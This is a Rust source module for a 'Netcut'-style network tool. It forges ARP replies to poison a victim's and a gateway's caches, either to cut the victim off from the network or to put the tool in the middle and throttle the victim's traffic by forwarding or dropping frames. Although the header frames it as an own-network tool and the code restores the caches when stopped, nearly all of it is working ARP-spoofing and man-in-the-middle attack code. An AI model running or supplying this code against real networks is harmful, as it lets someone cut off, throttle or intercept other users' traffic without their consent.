//! Netcut-tier: ARP-poison a victim's gateway mapping to cut it off, or
//! full-MITM forward+drop for per-host throttling.
//!
//! Own-network tool. Guards always restore honest ARP on drop — a poisoned
//! cache otherwise persists until it times out.
//!
//! The real engine needs feature `live` (pnet → Npcap SDK on Windows).

use std::net::Ipv4Addr;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};

#[derive(Debug, thiserror::Error)]
pub enum Error {
    #[error("control engine unavailable: {0}")]
    Unavailable(&'static str),
    #[error("{0}")]
    Failed(String),
}

/// Cut a host off entirely: poison only the victim ("gateway is at our
/// MAC"), so its traffic dies at us.
pub struct Cut {
    _guard: Guard,
}

/// Throttle a host: poison both victim and gateway (full MITM), then
/// forward with a token-bucket rate limit in the middle.
pub struct Throttle {
    _guard: Guard,
}

struct Guard {
    stop: Arc<AtomicBool>,
    #[cfg(feature = "live")]
    threads: Vec<std::thread::JoinHandle<()>>,
    #[cfg(feature = "live")]
    restore: Option<Box<dyn FnOnce() + Send>>,
}

impl Cut {
    #[cfg(feature = "live")]
    pub fn start(victim: Ipv4Addr, gateway: Ipv4Addr) -> Result<Self, Error> {
        live::start_cut(victim, gateway).map(|guard| Self { _guard: guard })
    }

    #[cfg(not(feature = "live"))]
    pub fn start(_victim: Ipv4Addr, _gateway: Ipv4Addr) -> Result<Self, Error> {
        Err(Error::Unavailable(
            "rebuild with feature `live` (needs pnet + Npcap SDK)",
        ))
    }

    pub fn stop(self) {} // drop restores
}

impl Throttle {
    /// `bytes_per_sec`: forwarding rate cap applied to victim traffic both ways.
    #[cfg(feature = "live")]
    pub fn start(victim: Ipv4Addr, gateway: Ipv4Addr, bytes_per_sec: u32) -> Result<Self, Error> {
        live::start_throttle(victim, gateway, bytes_per_sec).map(|guard| Self { _guard: guard })
    }

    #[cfg(not(feature = "live"))]
    pub fn start(
        _victim: Ipv4Addr,
        _gateway: Ipv4Addr,
        _bytes_per_sec: u32,
    ) -> Result<Self, Error> {
        Err(Error::Unavailable(
            "rebuild with feature `live` (needs pnet + Npcap SDK)",
        ))
    }

    pub fn stop(self) {} // drop restores
}

impl Drop for Guard {
    fn drop(&mut self) {
        self.stop.store(true, Ordering::Relaxed);
        #[cfg(feature = "live")]
        {
            for h in self.threads.drain(..) {
                let _ = h.join();
            }
            if let Some(restore) = self.restore.take() {
                restore();
            }
        }
    }
}

/// Local IPv4 that routes toward `target` (UDP trick — nothing sent).
pub fn local_ip_for(target: Ipv4Addr) -> Ipv4Addr {
    let Ok(sock) = std::net::UdpSocket::bind((Ipv4Addr::UNSPECIFIED, 0)) else {
        return Ipv4Addr::LOCALHOST;
    };
    if sock.connect((target, 80)).is_err() {
        return Ipv4Addr::LOCALHOST;
    }
    match sock.local_addr().map(|a| a.ip()) {
        Ok(std::net::IpAddr::V4(v4)) => v4,
        _ => Ipv4Addr::LOCALHOST,
    }
}

#[cfg(feature = "live")]
mod live {
    use std::net::Ipv4Addr;
    use std::sync::Arc;
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::thread;
    use std::time::{Duration, Instant};

    use pnet::datalink::{self, Channel, DataLinkReceiver, DataLinkSender};
    use pnet::packet::MutablePacket;
    use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket};
    use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
    use pnet::util::MacAddr;

    use super::{Error, Guard};

    /// Honest vs poisoned mapping, one direction:
    /// `(target_mac, target_ip)` should believe `sender_ip` is at `sender_mac`.
    #[derive(Clone, Copy)]
    struct ArpClaim {
        sender_mac: MacAddr,
        sender_ip: Ipv4Addr,
        target_mac: MacAddr,
        target_ip: Ipv4Addr,
    }

    struct Ctx {
        iface: datalink::NetworkInterface,
        our_mac: MacAddr,
        victim: Ipv4Addr,
        victim_mac: MacAddr,
        gateway: Ipv4Addr,
        gateway_mac: MacAddr,
    }

    fn mac_of(ip: Ipv4Addr) -> Result<MacAddr, Error> {
        ntod_core::arp::arp_table()
            .map_err(|e| Error::Failed(e.to_string()))?
            .get(&ip)
            .and_then(|m| m.parse().ok())
            .ok_or_else(|| Error::Failed(format!("no ARP entry for {ip} — scan first")))
    }

    fn ctx(victim: Ipv4Addr, gateway: Ipv4Addr) -> Result<Ctx, Error> {
        let our_ip = super::local_ip_for(victim);
        let iface = datalink::interfaces()
            .into_iter()
            .find(|i| {
                i.is_up()
                    && !i.is_loopback()
                    && i.mac.is_some()
                    && i.ips.iter().any(|n| n.ip() == std::net::IpAddr::V4(our_ip))
            })
            .ok_or_else(|| Error::Failed("no interface for local IP".into()))?;
        Ok(Ctx {
            our_mac: iface.mac.unwrap(),
            victim_mac: mac_of(victim)?,
            gateway_mac: mac_of(gateway)?,
            iface,
            victim,
            gateway,
        })
    }

    type EthChannel = (Box<dyn DataLinkSender>, Box<dyn DataLinkReceiver>);

    fn eth_channel(iface: &datalink::NetworkInterface) -> Result<EthChannel, Error> {
        let cfg = datalink::Config {
            read_timeout: Some(Duration::from_millis(100)),
            ..Default::default()
        };
        match datalink::channel(iface, cfg).map_err(|e| Error::Failed(e.to_string()))? {
            Channel::Ethernet(tx, rx) => Ok((tx, rx)),
            _ => Err(Error::Failed("not an ethernet channel".into())),
        }
    }

    fn build_arp(claim: &ArpClaim) -> [u8; 42] {
        let mut buf = [0u8; 42];
        {
            let mut eth = MutableEthernetPacket::new(&mut buf).unwrap();
            eth.set_destination(claim.target_mac);
            eth.set_source(claim.sender_mac);
            eth.set_ethertype(EtherTypes::Arp);
            let mut arp = MutableArpPacket::new(eth.payload_mut()).unwrap();
            arp.set_hardware_type(ArpHardwareTypes::Ethernet);
            arp.set_protocol_type(EtherTypes::Ipv4);
            arp.set_hw_addr_len(6);
            arp.set_proto_addr_len(4);
            arp.set_operation(ArpOperations::Reply);
            arp.set_sender_hw_addr(claim.sender_mac);
            arp.set_sender_proto_addr(claim.sender_ip);
            arp.set_target_hw_addr(claim.target_mac);
            arp.set_target_proto_addr(claim.target_ip);
        }
        buf
    }

    /// Spam poisoned ARP replies (~1/s) until `stop` flips.
    fn poison_loop(mut tx: Box<dyn DataLinkSender>, claims: Vec<ArpClaim>, stop: Arc<AtomicBool>) {
        let packets: Vec<[u8; 42]> = claims.iter().map(build_arp).collect();
        while !stop.load(Ordering::Relaxed) {
            for pkt in &packets {
                let _ = tx.send_to(pkt, None);
            }
            for _ in 0..10 {
                if stop.load(Ordering::Relaxed) {
                    return;
                }
                thread::sleep(Duration::from_millis(100));
            }
        }
    }

    /// Send honest ARP replies restoring each pair's real mapping.
    fn restore(c: &Ctx) {
        let Ok((mut tx, _rx)) = eth_channel(&c.iface) else {
            return;
        };
        let honest = [
            // victim learns the real gateway MAC
            ArpClaim {
                sender_mac: c.gateway_mac,
                sender_ip: c.gateway,
                target_mac: c.victim_mac,
                target_ip: c.victim,
            },
            // gateway learns the real victim MAC
            ArpClaim {
                sender_mac: c.victim_mac,
                sender_ip: c.victim,
                target_mac: c.gateway_mac,
                target_ip: c.gateway,
            },
        ];
        for _ in 0..3 {
            for claim in &honest {
                let _ = tx.send_to(&build_arp(claim), None);
            }
            thread::sleep(Duration::from_millis(200));
        }
    }

    fn poison_claims(c: &Ctx, bidirectional: bool) -> Vec<ArpClaim> {
        // victim believes gateway sits at our MAC
        let mut v = vec![ArpClaim {
            sender_mac: c.our_mac,
            sender_ip: c.gateway,
            target_mac: c.victim_mac,
            target_ip: c.victim,
        }];
        if bidirectional {
            // gateway believes victim sits at our MAC → we see both directions
            v.push(ArpClaim {
                sender_mac: c.our_mac,
                sender_ip: c.victim,
                target_mac: c.gateway_mac,
                target_ip: c.gateway,
            });
        }
        v
    }

    pub fn start_cut(victim: Ipv4Addr, gateway: Ipv4Addr) -> Result<Guard, Error> {
        let c = ctx(victim, gateway)?;
        let (tx, _rx) = eth_channel(&c.iface)?;
        let stop = Arc::new(AtomicBool::new(false));
        let poison_h = thread::spawn({
            let stop = stop.clone();
            let claims = poison_claims(&c, false);
            move || poison_loop(tx, claims, stop)
        });
        Ok(Guard {
            stop,
            threads: vec![poison_h],
            restore: Some(Box::new(move || restore(&c))),
        })
    }

    pub fn start_throttle(
        victim: Ipv4Addr,
        gateway: Ipv4Addr,
        bytes_per_sec: u32,
    ) -> Result<Guard, Error> {
        let c = ctx(victim, gateway)?;
        // Open both channels before spawning any threads so a failure can't leak a worker.
        let (tx, rx) = eth_channel(&c.iface)?;
        let (tx2, _rx2) = eth_channel(&c.iface)?;
        let stop = Arc::new(AtomicBool::new(false));

        // Poisoner (one channel direction) — owns the sender half.
        let poison_h = thread::spawn({
            let stop = stop.clone();
            let claims = poison_claims(&c, true);
            move || poison_loop(tx, claims, stop)
        });

        // Forwarder: re-send victim<->gateway frames through us, rate-limited.
        let (victim_mac, gateway_mac, our_mac) = (c.victim_mac, c.gateway_mac, c.our_mac);
        let fwd_h = thread::spawn({
            let stop = stop.clone();
            move || {
                forward_loop(
                    rx,
                    tx2,
                    victim_mac,
                    gateway_mac,
                    our_mac,
                    bytes_per_sec,
                    stop,
                )
            }
        });

        Ok(Guard {
            stop,
            threads: vec![poison_h, fwd_h],
            restore: Some(Box::new(move || restore(&c))),
        })
    }

    /// MITM forward loop: victim-bound frames rewritten to victim's real MAC
    /// (and vice versa), each direction capped at `rate` B/s token bucket.
    fn forward_loop(
        mut rx: Box<dyn DataLinkReceiver>,
        mut tx: Box<dyn DataLinkSender>,
        victim_mac: MacAddr,
        gateway_mac: MacAddr,
        our_mac: MacAddr,
        rate: u32,
        stop: Arc<AtomicBool>,
    ) {
        let mut tokens = rate as f64;
        let mut last = Instant::now();
        let mut buf = Vec::with_capacity(1600);
        while !stop.load(Ordering::Relaxed) {
            let Ok(frame) = rx.next() else { continue };
            let now = Instant::now();
            tokens = (tokens + now.duration_since(last).as_secs_f64() * rate as f64)
                .min(rate as f64 * 2.0);
            last = now;

            if frame.len() < 14 {
                continue;
            }
            let src = MacAddr::new(frame[6], frame[7], frame[8], frame[9], frame[10], frame[11]);
            let dst = MacAddr::new(frame[0], frame[1], frame[2], frame[3], frame[4], frame[5]);
            let real_dst = if src == victim_mac && dst == our_mac {
                gateway_mac
            } else if src == gateway_mac && dst == our_mac {
                victim_mac
            } else {
                continue; // not MITM-routed traffic
            };

            buf.clear();
            buf.extend_from_slice(frame);
            if let Some(mut eth) = MutableEthernetPacket::new(&mut buf) {
                eth.set_destination(real_dst);
                eth.set_source(our_mac);
            } else {
                continue;
            }
            let len = buf.len() as f64;
            if tokens >= len {
                tokens -= len;
                let _ = tx.send_to(&buf, None);
            } // else: dropped — this IS the throttle
        }
    }
}
